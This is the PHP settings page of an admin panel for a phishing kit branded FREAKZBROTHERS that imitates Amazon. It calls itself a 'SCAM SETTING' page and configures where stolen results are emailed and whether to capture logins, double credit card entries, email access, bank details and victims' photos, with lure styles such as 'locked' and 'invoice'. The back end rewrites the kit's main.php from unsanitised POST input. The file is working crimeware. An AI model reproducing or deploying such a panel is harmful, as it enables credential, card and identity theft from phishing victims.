<?php
error_reporting(0);
session_start();
date_default_timezone_set("Asia/Jakarta");
include '../main.php';
if (!isset($_SESSION['user'])) {
  header("location: login.php");
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <link rel="apple-touch-icon" sizes="76x76" href="img/apple-icon.png">
  <link rel="icon" type="image/png" href="img/favicon.png">
  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
  <title>FREAKZBROTHERS - PANEL</title>
  <meta content='width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0, shrink-to-fit=no' name='viewport' />
  <link href="https://fonts.googleapis.com/css?family=Montserrat:400,700,200" rel="stylesheet" />
  <script src="https://kit.fontawesome.com/a2ddabd525.js" crossorigin="anonymous"></script>
  <link href="css/bootstrap.min.css" rel="stylesheet" />
  <link href="css/paper-dashboard.css?v=2.0.0" rel="stylesheet" />
  <link href="demo/demo.css" rel="stylesheet" />
</head>

<body class="">
  <div class="wrapper ">
    <div class="sidebar" data-color="black" data-active-color="danger">
      <div class="logo">
        <a href="#" class="simple-text logo-mini">
            <font style="font-size:32px;"><i class="fab fa-amazon"></i></font>
        </a>
        <a href="setting.php" class="simple-text logo-normal">
          <strong>FREAKZBROTHERS</strong>
        </a>
      </div>
      <div class="sidebar-wrapper">
        <ul class="nav">
          <li>
            <a href="index.php">
              <i class="fas fa-chart-bar"></i>
              <p>Statistic</p>
            </a>
          </li>
          <li class="active ">
            <a href="setting.php">
              <i class="fas fa-cogs"></i>
              <p>Settings</p>
            </a>
          </li>
          <li>
            <a href="antibot.php">
              <i class="fas fa-robot"></i>
              <p>Antibot</p>
            </a>
          </li>
          <li>
            <a href="reset.php">
              <i class="fas fa-trash-alt"></i>
              <p>Reset Logs</p>
            </a>
          </li>
          <li>
            <a href="logout.php">
              <i class="fas fa-sign-out-alt"></i>
              <p>Log Out</p>
            </a>
          </li>
        </ul>
      </div>
    </div>
    <div class="main-panel">
      <!-- Navbar -->
      <nav class="navbar navbar-expand-lg navbar-absolute fixed-top navbar-transparent">
        <div class="container-fluid">
          <div class="navbar-wrapper">
            <div class="navbar-toggle">
              <button type="button" class="navbar-toggler">
              </button>
            </div>
            <a class="navbar-brand" href="#"><strong><font style="font-family:tahoma;">SETTING</font></strong></a>
          </div>
          <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navigation" aria-controls="navigation-index" aria-expanded="false" aria-label="Toggle navigation">
          </button>
          <div class="collapse navbar-collapse justify-content-end" id="navigation">
            <ul class="navbar-nav">
              <li class="nav-item">
                <a class="nav-link btn-rotate" href="https://<?php echo $_SERVER['SERVER_NAME']; ?>/?<?= $parameter ?>">
                  <p><strong>[ VIEW SCAM ]</strong></p>
                </a>
              </li>
            </ul>
          </div>
        </div>
      </nav>
      <div class="content">
        <div class="row">
          <div class="col-md-12">
            <div class="card ">
              <div class="card-header ">
                <h5 class="card-title"><strong>SCAM SETTING</strong></h5>
              </div>
              <div class="card-body ">
                <form action="" method="post" class="form-horizontal">
                <table class="table">
                  <thead class="text-danger">
                    <tr>
                      <td><strong>NAME</strong></td>
                      <td><strong>NEW</strong></td>
                      <td><strong>OLD</strong></td>
                      <td><strong>ACTION</strong></td>
                    </tr>
                  </thead>
                  <tbody>
                    <tr>
                      <td>
                        <strong>Email Result</strong>
                      </td>
                      <td>
                        <div class="col-md-8">
                          <input type="text" name="baru" class="form-control" placeholder="example@domain.com">
                        </div>
                      </td>
                      <td>
                        <div class="col-md-8">
                          <input type="text" class="form-control" name="lama" readonly value="<?= $result; ?>"></div>
                        </td>
                      <td>
                        <div class="col-md-12">
                          <input name="email" class="btn btn-danger btn-block" type="submit" Value="Save" />
                        </div>
                      </td>
                    </tr>
                    <tr>
                      <td>
                        <strong>Parameter</strong>
                      </td>
                      <td>
                        <div class="col-md-8">
                          <input type="text" name="paramb" class="form-control" placeholder="apsignin">
                        </div>
                      </td>
                      <td>
                        <div class="col-md-8">
                          <input type="text" class="form-control" name="paraml" readonly value="<?= $parameter; ?>"></div>
                        </td>
                      <td>
                          <div class="col-md-12">
                            <input name="parameter" class="btn btn-danger btn-block" type="submit" Value="Save" />
                          </div>
                        </td>
                    </tr>
                    <tr>
                      <td>
                        <strong>ONETIME</strong>
                      </td>
                      <td>
                        <div class="col-md-8">
                          <select name="onetimeb" class="form-control" />
                          <option disabled selected hidden><?= $onetime; ?></option>
                          <option>YES</option>
                          <option>NO</option>
                        </div>
                      </td>
                      <td>
                        <div class="col-md-8">
                          <input type="text" class="form-control" name="onetimel" readonly value="<?= $onetime; ?>"></div>
                        </td>
                      <td>
                          <div class="col-md-12">
                            <input name="onetime" class="btn btn-danger btn-block" type="submit" Value="Save" />
                          </div>
                        </td>
                    </tr>
                    <tr>
                      <td>
                        <strong>DOUBLE CC</strong>
                      </td>
                      <td>
                        <div class="col-md-8">
                          <select name="double_ccb" class="form-control" />
                          <option disabled selected hidden><?= $double_cc; ?></option>
                          <option>Yes</option>
                          <option>No</option>
                        </div>
                      </td>
                      <td>
                        <div class="col-md-8">
                          <input type="text" class="form-control" name="double_ccl" readonly value="<?= $double_cc; ?>"></div>
                        </td>
                      <td>
                          <div class="col-md-12">
                            <input name="doublecc" class="btn btn-danger btn-block" type="submit" Value="Save" />
                          </div>
                        </td>
                    </tr>
                    <tr>
                      <td>
                        <strong>EMAIL ACCESS</strong>
                      </td>
                      <td>
                        <div class="col-md-8">
                          <select name="email_baru" class="form-control" />
                          <option disabled selected hidden><?= $email_access; ?></option>
                          <option>IYA</option>
                          <option>TIDAK</option>
                        </div>
                      </td>
                      <td>
                        <div class="col-md-8">
                          <input type="text" class="form-control" name="email_lama" readonly value="<?= $email_access; ?>"></div>
                        </td>
                      <td>
                          <div class="col-md-12">
                            <input name="emailog" class="btn btn-danger btn-block" type="submit" Value="Save" />
                          </div>
                        </td>
                    </tr>
                    <tr>
                      <td>
                        <strong>SEND LOGIN</strong>
                      </td>
                      <td>
                        <div class="col-md-8">
                          <select name="sendloginb" class="form-control" />
                          <option disabled selected hidden><?= $sendlog; ?></option>
                          <option>ON</option>
                          <option>OFF</option>
                        </div>
                      </td>
                      <td>
                        <div class="col-md-8">
                          <input type="text" class="form-control" name="sendloginl" readonly value="<?= $sendlog; ?>"></div>
                        </td>
                        <td>
                          <div class="col-md-12">
                            <input name="sendlogin" class="btn btn-danger btn-block" type="submit" Value="Save" />
                          </div>
                        </td>
                    </tr>
                    <tr>
                      <td>
                        <strong>GET BANK</strong>
                      </td>
                      <td>
                        <div class="col-md-8">
                          <select name="bankb" class="form-control" />
                          <option disabled selected hidden><?= $get_bank; ?></option>
                          <option>Yups</option>
                          <option>Nops</option>
                        </div>
                      </td>
                      <td>
                        <div class="col-md-8">
                          <input type="text" class="form-control" name="bankl" readonly value="<?= $get_bank; ?>"></div>
                        </td>
                        <td>
                          <div class="col-md-12">
                            <input name="bankacc" class="btn btn-danger btn-block" type="submit" Value="Save" />
                          </div>
                        </td>
                    </tr>
                    <tr>
                      <td>
                        <strong>GET PHOTO</strong>
                      </td>
                      <td>
                        <div class="col-md-8">
                          <select name="getpapb" class="form-control" />
                          <option disabled selected hidden><?= $config['get_photo']; ?></option>
                          <option>Oks</option>
                          <option>Nos</option>
                        </div>
                      </td>
                      <td>
                        <div class="col-md-8">
                          <input type="text" class="form-control" name="getpapl" readonly value="<?= $config['get_photo']; ?>"></div>
                        </td>
                        <td>
                          <div class="col-md-12">
                            <input name="getpap" class="btn btn-danger btn-block" type="submit" Value="Save" />
                          </div>
                        </td>
                    </tr>
                    <tr>
                      <td>
                        <strong>STYLE</strong>
                      </td>
                      <td>
                        <div class="col-md-8">
                          <select name="styleb" class="form-control" />
                          <option disabled selected hidden><?= $style; ?></option>
                          <option>locked</option>
                          <option>verify</option>
                          <option>invoice</option>
                        </div>
                      </td>
                      <td>
                        <div class="col-md-8">
                          <input type="text" class="form-control" name="stylel" readonly value="<?= $style; ?>"></div>
                        </td>
                        <td>
                          <div class="col-md-12">
                            <input name="style" class="btn btn-danger btn-block" type="submit" Value="Save" />
                          </div>
                        </td>
                    </tr>
                  </tbody>
                </table>
                <span class="help-block">This configuration for your scampage fiture</span>
              </div>
              <div class="card-footer ">
              </div>
            </div>
          </div>
        </div>
        <div class="row">
        </div>
      </div>
      <footer class="footer footer-black  footer-white ">
        <div class="container-fluid">
          <div class="row">
            <div class="credits ml-auto">
              <span class="copyright">
                ©
                <script>
                  document.write(new Date().getFullYear())
                </script>, made with <i class="fa fa-heart heart"></i> by FREAKZBROTHERS
              </span>
            </div>
          </div>
        </div>
      </footer>
    </div>
  </div>
  <!--   Core JS Files   -->
  <script src="js/core/jquery.min.js"></script>
  <script src="js/core/popper.min.js"></script>
  <script src="js/core/bootstrap.min.js"></script>
  <script src="js/plugins/perfect-scrollbar.jquery.min.js"></script>
  <!--  Google Maps Plugin    -->
  <script src="https://maps.googleapis.com/maps/api/js?key=YOUR_KEY_HERE"></script>
  <!-- Chart JS -->
  <script src="js/plugins/chartjs.min.js"></script>
  <!--  Notifications Plugin    -->
  <script src="js/plugins/bootstrap-notify.js"></script>
  <!-- Control Center for Now Ui Dashboard: parallax effects, scripts for the example pages etc -->
  <script src="js/paper-dashboard.min.js?v=2.0.0" type="text/javascript"></script>
  <!-- Paper Dashboard DEMO methods, don't include it in your project! -->
  <script src="demo/demo.js"></script>
  <script>
    $(document).ready(function() {
      // Javascript method's body can be found in assets/assets-for-demo/js/demo.js
      demo.initChartsPages();
    });
  </script>
</body>
</html>
<?php
   unlink("set.php");
 
    $lama         = trim($_POST['lama']);
    $baru         = trim($_POST['baru']);
    $paraml      = trim($_POST['paraml']);
    $paramb      = trim($_POST['paramb']);
    $email_lama   = trim($_POST['email_lama']);
    $email_baru   = trim($_POST['email_baru']);
    $sendloginl     = trim($_POST['sendloginl']);
    $sendloginb     = trim($_POST['sendloginb']);
    $double_ccl     = trim($_POST['double_ccl']);
    $double_ccb     = trim($_POST['double_ccb']);
    $bankl      = trim($_POST['bankl']);
    $bankb      = trim($_POST['bankb']);
    $getpapl      = trim($_POST['getpapl']);
    $getpapb      = trim($_POST['getpapb']);
    $stylel      = trim($_POST['stylel']);
    $styleb      = trim($_POST['styleb']);
    $file         = "../main.php";
    $isi          = file_get_contents($file);
 
if(isset($_POST['email'])) {
    if(preg_match("#\b$lama\b#is", $isi)) {
        $isi = str_replace($lama,$baru,$isi);
        $buka = fopen($file,'w');
        fwrite($buka,$isi);
        fclose($buka);
 
        echo "<script type='text/javascript'>window.top.location='setting.php';</script>";
    }
    else
         echo "<script>alert('Failed')</script>";
}
else if(isset($_POST['parameter'])) {
   if(preg_match("#\b$paraml\b#is", $isi)) {
        $isi = str_replace($paraml,$paramb,$isi);
        $buka = fopen($file,'w');
        fwrite($buka,$isi);
        fclose($buka);
 
        echo "<script type='text/javascript'>window.top.location='setting.php';</script>";
    }
    else
         echo "<script>alert('Failed')</script>";
}else if(isset($_POST['emailog'])) {
   if(preg_match("#$email_lama#is", $isi)) {
        $isi = str_replace($email_lama,$email_baru,$isi);
        $buka = fopen($file,'w');
        fwrite($buka,$isi);
        fclose($buka);
        echo "<script type='text/javascript'>window.top.location='setting.php';</script>";
    }
    else
         echo "<script>alert('Failed')</script>";
}else if(isset($_POST['getpap'])) {
   if(preg_match("#$getpapl#is", $isi)) {
        $isi = str_replace($getpapl,$getpapb,$isi);
        $buka = fopen($file,'w');
        fwrite($buka,$isi);
        fclose($buka);
        echo "<script type='text/javascript'>window.top.location='setting.php';</script>";
    }
    else
         echo "<script>alert('Failed')</script>";
}else if(isset($_POST['sendlogin'])) {
   if(preg_match("#$sendloginl#is", $isi)) {
        $isi = str_replace($sendloginl,$sendloginb,$isi);
        $buka = fopen($file,'w');
        fwrite($buka,$isi);
        fclose($buka);
        echo "<script type='text/javascript'>window.top.location='setting.php';</script>";
    }
    else
         echo "<script>alert('Failed')</script>";
}else if(isset($_POST['doublecc'])) {
   if(preg_match("#$double_ccl#is", $isi)) {
        $isi = str_replace($double_ccl,$double_ccb,$isi);
        $buka = fopen($file,'w');
        fwrite($buka,$isi);
        fclose($buka);
        echo "<script type='text/javascript'>window.top.location='setting.php';</script>";
    }
    else
         echo "<script>alert('Failed')</script>";
}else if(isset($_POST['bankacc'])) {
   if(preg_match("#$bankl#is", $isi)) {
        $isi = str_replace($bankl,$bankb,$isi);
        $buka = fopen($file,'w');
        fwrite($buka,$isi);
        fclose($buka);
        echo "<script type='text/javascript'>window.top.location='setting.php';</script>";
    }
    else
         echo "<script>alert('Failed')</script>";
}else if(isset($_POST['style'])) {
   if(preg_match("#$stylel#is", $isi)) {
        $isi = str_replace($stylel,$styleb,$isi);
        $buka = fopen($file,'w');
        fwrite($buka,$isi);
        fclose($buka);
        echo "<script type='text/javascript'>window.top.location='setting.php';</script>";
    }
    else
         echo "<script>alert('Failed')</script>";
}
?>